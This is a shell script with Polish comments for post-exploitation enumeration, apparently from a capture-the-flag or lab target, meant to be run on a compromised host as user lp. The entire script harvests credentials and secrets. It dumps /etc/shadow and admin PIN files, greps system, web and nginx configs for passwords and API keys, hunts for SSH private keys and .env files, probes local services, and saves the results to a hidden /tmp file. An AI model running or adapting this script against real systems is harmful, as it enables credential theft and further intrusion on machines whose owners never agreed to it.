#!/bin/sh
# Enum haseł / hashy / configów — uruchamiane NA target jako lp (wywołaj przez LPD lub ręcznie)
set +e
OUT=/tmp/.enumc
: > "$OUT"

run() { echo "=== $1 ===" >> "$OUT"; shift; "$@" >> "$OUT" 2>&1 || true; echo >> "$OUT"; }

run id id
run passwd-head head -30 /etc/passwd
run shadow-test cat /etc/shadow 2>&1 | head -5
run group-archivist getent group archivist; getent passwd archivist lp root 2>/dev/null

run etc-paperwork ls -la /etc/paperwork/ 2>&1
run admin-pins cat /etc/paperwork/admin_pins.conf 2>&1
run find-etc-pass grep -rilE 'password|passwd|secret|pin|hash|credential|api[_-]?key' /etc 2>/dev/null | head -80

run systemd-lpd systemctl cat lpdserver.service 2>/dev/null | head -40
run systemd-jet systemctl cat jetdirect.service 2>/dev/null | head -40
run systemd-corpo systemctl cat corpusite.service 2>/dev/null | head -40
run systemd-paper systemctl cat paperwork-daemon.service 2>/dev/null | head -40

run env-lpd cat /opt/LPDServer/.env 2>&1
run lpd-env grep -r LPD /etc/systemd 2>/dev/null | head -20

run find-home find /home -type f \( -name '*.env' -o -name '*pass*' -o -name '*cred*' -o -name 'id_rsa*' -o -name 'authorized_keys' -o -name '*.conf' \) 2>/dev/null | head -50
run find-opt find /opt /usr/local -type f \( -name '*.env' -o -name '*pass*' -o -name '*.conf' \) 2>/dev/null | head -40

run grep-www grep -rilE 'password|secret|pin|admin|hash|token' /var/www 2>/dev/null | head -30
run nginx-cat grep -r password /etc/nginx 2>/dev/null | head -20

run laurel-cfg cat /etc/laurel/config.toml 2>/dev/null | head -80
run corpo-curl curl -s http://127.0.0.1:1337/ 2>&1 | grep -iE 'pass|pin|secret|admin|login' | head -15

run mgmt-test python3 -c "
import socket
try:
 s=socket.socket(socket.AF_UNIX);s.settimeout(2);s.connect('/run/paperwork/mgmt.sock');print(s.recv(512))
except Exception as e: print(e)
" 2>&1

run hist ls -la /home/lp/.bash_history /home/archivist/.bash_history 2>&1 | head -5
run sshd-grep grep -iE 'authorizedkeys|password|match' /etc/ssh/sshd_config /etc/ssh/sshd_config.d/* 2>/dev/null

run ss-9100 ss -lntp 2>/dev/null | grep -E '9100|1337|1515' || true

wc -c "$OUT" >> "$OUT"
cat "$OUT"